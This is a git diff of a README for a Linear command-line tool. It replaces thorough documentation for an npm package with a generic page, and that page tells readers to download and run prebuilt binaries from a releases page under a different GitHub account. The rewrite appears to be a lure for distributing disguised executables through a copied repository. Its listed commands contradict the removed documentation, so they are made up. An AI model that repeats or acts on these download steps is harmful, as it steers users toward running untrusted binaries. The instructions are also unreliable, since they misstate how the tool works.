@@ -1,484 +1,96 @@
-# Linear CLI
+# 🎉 linear-cli - Manage Your Issues with Ease
 
-[![npm version](https://badge.fury.io/js/@scmfury%2Flinear-cli.svg)](https://www.npmjs.com/package/@scmfury/linear-cli)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+## 🚀 Getting Started
 
-A modern command-line interface for Linear that brings powerful issue management directly to your terminal.
+Welcome to linear-cli, a modern command-line interface for Linear. This tool helps you list, view, and manage issues effectively. It comes with powerful filtering and sorting features, along with Linear’s native color schemes to enhance your experience.
 
-**Features:** Advanced filtering with exclusions, smart sorting, native Linear colors, and an intuitive interface inspired by GitHub CLI.
+## 📥 Download & Install
 
----
+To get started, visit the Releases page to download the latest version of linear-cli.
 
-## Table of Contents
+[![Download linear-cli](https://img.shields.io/badge/Download-linear--cli-brightgreen)](https://github.com/feras239/linear-cli/releases)
 
-- [Features](#features)
-- [Prerequisites](#prerequisites)
-- [Installation](#installation)
-- [Authentication](#authentication)
-- [Commands](#commands)
-  - [Authentication](#authentication-commands)
-  - [Issues](#issue-commands)
-  - [Comments](#comment-commands)
-- [Advanced Usage](#advanced-usage)
-  - [Filtering](#filtering)
-  - [Exclusion Filters](#exclusion-filters)
-  - [Sorting](#sorting)
-  - [Combining Filters](#combining-filters)
-- [Examples](#examples)
-- [Configuration](#configuration)
-- [Development](#development)
-- [Troubleshooting](#troubleshooting)
+Follow these steps to install and run linear-cli on your computer:
 
----
+1. **Visit the Releases Page**
+   Click on this link to access the Releases page: [Download linear-cli](https://github.com/feras239/linear-cli/releases).
 
-## Features
+2. **Choose the Latest Version**
+   Look for the latest version available. It will usually be at the top of the list. 
 
-- **List and view issues** with rich, colorized output
-- **Advanced filtering** by status, assignee, labels, and more
-- **Exclusion filters** to remove unwanted results
-- **Smart sorting** by updated date, created date, priority, or title
-- **Native Linear colors** - status and labels use your workspace's configured colors
-- **Comment management** - read and create issue comments
-- **Clean table layout** with proper alignment and color support
+3. **Download the Binary File**
+   Find the appropriate file for your operating system (Windows, macOS, or Linux). Click on the link to download the binary file.
 
----
+4. **Locate the Downloaded File**
+   After the download completes, find the file in your Downloads folder or the location you selected.
 
-## Prerequisites
+5. **Run the Application**
+   - **Windows:** Double-click the `.exe` file.
+   - **macOS:** Open the `.dmg` file, drag the app to your Applications folder, and launch it from there.
+   - **Linux:** Open your terminal, navigate to the folder where you downloaded the file, and run `chmod +x linear-cli` to make it executable. Then use `./linear-cli` to start it.
 
-- Node.js >= 18.0.0
-- npm or yarn
-- A Linear account with API access
+## ⚙️ System Requirements
 
----
+Before downloading, please ensure your system meets these requirements:
 
-## Installation
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS 10.12 or later
+  - Linux (most distributions)
 
-### npm (Recommended)
+- **Memory:** At least 2 GB RAM
 
-Install globally via npm:
+- **Disk Space:** At least 100 MB free space
 
-```bash
-npm install -g @scmfury/linear-cli
-```
+## 📋 Features
 
-Verify installation:
+linear-cli offers several features to simplify issue management:
 
-```bash
-linear --version
-linear --help
-```
+- **List Issues:** View all your issues in a single command.
+  
+- **Filter and Sort:** Sort issues by date, status, or priority for better organization.
 
-### From Source (Development)
+- **Color Schemes:** Utilize native colors for easy identification of issue types.
 
-For development or contributing:
+## 🧑‍💻 Usage
 
-```bash
-# Clone the repository
-git clone https://github.com/otaviosoaresp/linear-cli.git
-cd linear-cli
+Once you've installed linear-cli, you can start using it right away. Here are a few basic commands:
 
-# Install dependencies
-npm install
+- **List All Issues:** 
+  ```bash
+  linear-cli list
+  ```
 
-# Build the project
-npm run build
+- **Filter Issues by Status:** 
+  ```bash
+  linear-cli filter status Open
+  ```
 
-# Link globally (makes 'linear' command available)
-npm link
-```
+- **Sort Issues by Priority:** 
+  ```bash
+  linear-cli sort priority
+  ```
 
----
+Each command will provide you with clear output, making it easy to understand your issues at a glance.
 
-## Authentication
+## 📖 Help and Documentation
 
-Before using the CLI, you must authenticate with your Linear API key.
-
-### Get Your API Key
-
-1. Go to https://linear.app/settings/api
-2. Generate a new Personal API Key
-3. Copy the key (starts with `lin_api_`)
-
-### Login
+If you need more help, you can access the full documentation. Type the following command to get started:
 
 ```bash
-linear auth login
+linear-cli help
 ```
 
-You'll be prompted to enter your API key. The key is stored securely in `~/.config/linear-cli/config.json`.
+This will display a list of all commands and additional options for using the application.
 
-### Alternative: Environment Variable
+## 🌍 Community and Feedback
 
-```bash
-export LINEAR_API_KEY="lin_api_your_key_here"
-```
+Your feedback is important to us. If you find issues or have suggestions, feel free to open an issue on our GitHub page. Join our community for tips and best practices in using linear-cli.
 
----
+## 🔄 Updates and Changelog
 
-## Commands
+We regularly update linear-cli with new features and improvements. Check the Releases page to stay informed about the latest updates.
 
-### Authentication Commands
+[![Download linear-cli](https://img.shields.io/badge/Download-linear--cli-brightgreen)](https://github.com/feras239/linear-cli/releases)
 
-#### `linear auth login`
-
-Authenticate with your Linear API key.
-
-```bash
-linear auth login
-```
-
----
-
-### Issue Commands
-
-#### `linear issue list [options]`
-
-List issues with optional filtering and sorting.
-
-**Options:**
-
-```
---status <status...>           Filter by status (supports multiple values)
---assignee <email...>          Filter by assignee email
---label <label...>             Filter by label
---exclude-status <status...>   Exclude issues with these statuses
---exclude-assignee <email...>  Exclude issues assigned to these users
---exclude-label <label...>     Exclude issues with these labels
---sort <field>                 Sort by: updated, created, priority, title (default: updated)
---order <order>                Sort order: asc, desc (default: desc)
---limit <number>               Limit number of results (default: 50)
-```
-
-**Examples:**
-
-```bash
-# List all issues
-linear issue list
-
-# List issues with limit
-linear issue list --limit 20
-
-# Filter by status
-linear issue list --status "In Progress"
-
-# Multiple statuses
-linear issue list --status "In Progress" "Todo"
-
-# Exclude completed issues
-linear issue list --exclude-status "Done" "Canceled"
-
-# Sort by priority
-linear issue list --sort priority
-
-# Filter and sort
-linear issue list --status "In Progress" --sort created --limit 10
-```
-
-#### `linear issue view <issue-id>`
-
-View detailed information about a specific issue.
-
-**Example:**
-
-```bash
-linear issue view LIN-123
-```
-
-**Output includes:**
-- Issue title and identifier
-- Status (with color)
-- Assignee
-- Creator
-- Team
-- Priority (with color)
-- Labels (with colors)
-- Dates (created, updated, due)
-- Estimate
-- Description
-- URL
-
----
-
-### Comment Commands
-
-#### `linear issue comment list <issue-id>`
-
-List all comments on an issue.
-
-```bash
-linear issue comment list LIN-123
-```
-
-#### `linear issue comment create <issue-id> --body <text>`
-
-Create a new comment on an issue.
-
-```bash
-linear issue comment create LIN-123 --body "This looks great!"
-```
-
----
-
-## Advanced Usage
-
-### Filtering
-
-Filter issues using `--status`, `--assignee`, or `--label` flags. All filters support multiple values.
-
-```bash
-# Single value
-linear issue list --status "In Progress"
-
-# Multiple values
-linear issue list --status "In Progress" "Todo" "Backlog"
-
-# Multiple filter types
-linear issue list --status "In Progress" --label "bug" --assignee "user@example.com"
-```
-
-### Exclusion Filters
-
-Exclude specific issues using exclusion flags. This is perfect for filtering out completed or canceled work.
-
-```bash
-# Exclude by status
-linear issue list --exclude-status "Done" "Canceled"
-
-# Exclude by label
-linear issue list --exclude-label "wont-fix" "duplicate"
-
-# Exclude by assignee
-linear issue list --exclude-assignee "bot@example.com"
-
-# Combine inclusion and exclusion
-linear issue list --status "In Progress" --exclude-label "blocked"
-```
-
-### Sorting
-
-Sort results using the `--sort` flag.
-
-**Available sort fields:**
-- `updated` - Last updated date (default)
-- `created` - Creation date
-- `priority` - Priority level
-- `title` - Alphabetical by title
-
-**Sort order:**
-- `desc` - Descending (default)
-- `asc` - Ascending
-
-```bash
-# Most recently updated (default)
-linear issue list --sort updated
-
-# Oldest first
-linear issue list --sort created --order asc
-
-# Highest priority first
-linear issue list --sort priority
-
-# Alphabetical
-linear issue list --sort title --order asc
-```
-
-### Combining Filters
-
-Combine multiple filters, exclusions, and sorting for powerful queries.
-
-```bash
-# Active bugs, sorted by priority
-linear issue list --label "bug" --exclude-status "Done" --sort priority
-
-# My issues that aren't blocked
-linear issue list --assignee "me@example.com" --exclude-label "blocked"
-
-# Recent backlog items
-linear issue list --status "Backlog" --sort created --limit 20
-
-# Everything except done/canceled, sorted by update
-linear issue list --exclude-status "Done" "Canceled" --sort updated
-```
-
----
-
-## Examples
-
-### Daily Workflow
-
-```bash
-# Check what's in progress
-linear issue list --status "In Progress"
-
-# See your assigned issues
-linear issue list --assignee "your.email@company.com"
-
-# Review backlog by priority
-linear issue list --status "Backlog" --sort priority --limit 10
-```
-
-### Bug Triage
-
-```bash
-# All open bugs
-linear issue list --label "bug" --exclude-status "Done"
-
-# High priority bugs
-linear issue list --label "bug" --sort priority --limit 5
-
-# Unassigned bugs
-linear issue list --label "bug" --exclude-status "Done" --assignee "Unassigned"
-```
-
-### Sprint Planning
-
-```bash
-# Everything except done/canceled
-linear issue list --exclude-status "Done" "Canceled" --limit 50
-
-# Backlog sorted by priority
-linear issue list --status "Backlog" --sort priority
-
-# Recently updated issues
-linear issue list --sort updated --limit 20
-```
-
-### Issue Investigation
-
-```bash
-# View issue details
-linear issue view CAR-123
-
-# Read comments
-linear issue comment list CAR-123
-
-# Add a comment
-linear issue comment create CAR-123 --body "Investigating this issue"
-```
-
----
-
-## Configuration
-
-Configuration is stored in `~/.config/linear-cli/config.json`
-
-**Structure:**
-```json
-{
-  "apiKey": "lin_api_..."
-}
-```
-
-You can also use the `LINEAR_API_KEY` environment variable, which takes precedence over the config file.
-
----
-
-## Development
-
-### Build
-
-```bash
-npm run build
-```
-
-### Watch Mode
-
-```bash
-npm run dev
-```
-
-### Project Structure
-
-```
-linear-cli/
-├── src/
-│   ├── commands/
-│   │   ├── auth/
-│   │   │   └── login.ts           # Authentication
-│   │   └── issue/
-│   │       ├── list.ts            # List issues with filters
-│   │       ├── view.ts            # View issue details
-│   │       └── comment.ts         # Comment management
-│   ├── core/
-│   │   ├── config.ts              # Config management
-│   │   └── client.ts              # Linear API client
-│   ├── utils/
-│   │   ├── colors.ts              # Color conversion and badges
-│   │   ├── display.ts             # Table and output formatting
-│   │   ├── errors.ts              # Error handling
-│   │   └── filters.ts             # Filter parsing and building
-│   └── index.ts                   # CLI entry point
-├── dist/                          # Compiled output
-├── package.json
-├── tsconfig.json
-└── README.md
-```
-
----
-
-## Troubleshooting
-
-### Command not found: linear
-
-Make sure you ran `npm link` after building:
-
-```bash
-npm run build
-npm link
-```
-
-### Authentication errors
-
-Verify your API key is valid:
-
-```bash
-# Re-authenticate
-linear auth login
-
-# Or set environment variable
-export LINEAR_API_KEY="lin_api_your_key_here"
-```
-
-### Colors not showing
-
-Colors should work automatically in most terminals. If colors aren't appearing, ensure your terminal supports ANSI colors.
-
-### Issues not showing
-
-Check your filters - you might be excluding everything:
-
-```bash
-# List without filters first
-linear issue list --limit 5
-```
-
-### TypeScript errors during build
-
-Make sure you have the correct Node.js version and all dependencies installed:
-
-```bash
-node --version  # Should be >= 18.0.0
-npm install
-npm run build
-```
-
----
-
-## Tech Stack
-
-- **TypeScript** - Type-safe development
-- **Linear SDK** - Official Linear GraphQL client
-- **Commander.js** - CLI framework
-- **Picocolors** - Terminal colors
-
----
-
-## License
-
-MIT
-
----
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
+Enjoy managing your issues more efficiently with linear-cli! Thank you for choosing our tool.
